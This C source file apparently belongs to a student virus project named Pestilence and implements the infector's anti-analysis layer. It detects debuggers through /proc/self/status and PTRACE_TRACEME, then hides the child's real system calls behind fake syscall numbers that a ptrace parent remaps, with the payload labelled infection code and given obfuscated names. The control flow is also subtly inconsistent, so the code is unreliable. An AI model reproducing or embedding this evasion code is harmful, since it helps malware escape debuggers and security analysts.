/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   syscall_tracer.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/09 18:09:51 by jainavas          #+#    #+#             */
/*   Updated: 2026/01/09 22:32:01 by jainavas         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/pestilence.h"

static bool check_debugger_parent(void)
{
    FILE *fp;
    char line[256];
    
    // Método 1: Leer /proc/self/status
    fp = fopen("/proc/self/status", "r");
    if (!fp)
        return false;
    
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int tracer_pid;
            sscanf(line + 10, "%d", &tracer_pid);
            fclose(fp);
            return (tracer_pid != 0);
        }
    }
    
    fclose(fp);
    return false;
}

// Proceso HIJO: se auto-tracrea y ejecuta la infección
void child_process(void)
{
    // Auto-tracearse (permite que el padre nos intercepte)
    // Si falla = hay un debugger externo → salir silenciosamente
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        exit(1);
    }
    
    // Enviar señal al padre para que sepa que estamos listos
    raise(SIGSTOP);
    
    // ===== CÓDIGO DE INFECCIÓN =====
	pepino /= 4;
	calculadoradepepino();
    
    exit(0);
}

// Proceso PADRE: intercepta syscalls del hijo y los parchea
void parent_tracer(pid_t child_pid)
{
    int status;
    struct user_regs_struct regs;
    
    // Esperar a que el hijo se detenga (SIGSTOP)
    waitpid(child_pid, &status, 0);
    
    // Verificar que se detuvo correctamente
    if (!WIFSTOPPED(status)) {
        return;
    }
    
    // Opciones: matar al hijo si el padre muere
    ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_EXITKILL);
    
    // Loop principal: interceptar CADA syscall
    while (1) {
        // Continuar hasta la ENTRADA del siguiente syscall
        ptrace(PTRACE_SYSCALL, child_pid, 0, 0);
        waitpid(child_pid, &status, 0);
        
        // Si el hijo terminó, salir
        if (WIFEXITED(status) || WIFSIGNALED(status))
            break;
        
        // Leer registros (contiene número de syscall en orig_rax)
        ptrace(PTRACE_GETREGS, child_pid, 0, &regs);
        
        // Detectar y reemplazar syscalls custom
        bool modified = false;
        
        if (regs.orig_rax == SYS_CUSTOM_WRITE) {
            // 9999 → write (1)
            regs.orig_rax = 1;
            modified = true;
        } else if (regs.orig_rax == SYS_CUSTOM_OPEN) {
            // 9998 → open (2)
            regs.orig_rax = 2;
            modified = true;
        } else if (regs.orig_rax == SYS_CUSTOM_CLOSE) {
            // 9997 → close (3)
            regs.orig_rax = 3;
            modified = true;
        }
        
        // Si modificamos, escribir de vuelta
        if (modified) {
            ptrace(PTRACE_SETREGS, child_pid, 0, &regs);
        }
        
        // Continuar hasta la SALIDA del syscall
        ptrace(PTRACE_SYSCALL, child_pid, 0, 0);
        waitpid(child_pid, &status, 0);
        
        // Verificar de nuevo si terminó después de ejecutar el syscall
        if (WIFEXITED(status) || WIFSIGNALED(status))
            break;
    }
}

void run2withtracer(int h)
{
    if (h == 0) {
		calculadoradepepino();
    } else {
        parent_tracer(h);
    }
}

// Función pública: orquesta el fork y el tracing
void run_with_tracer(void)
{
    pid_t pid;
    
    pid = fork();
    
	if (check_debugger_parent())
		exit(1);

    if (pid == -1) {
        exit(1);
    }
	pepino = (pepino * -1) * (pepino * -1);
	run2withtracer(pid);
}
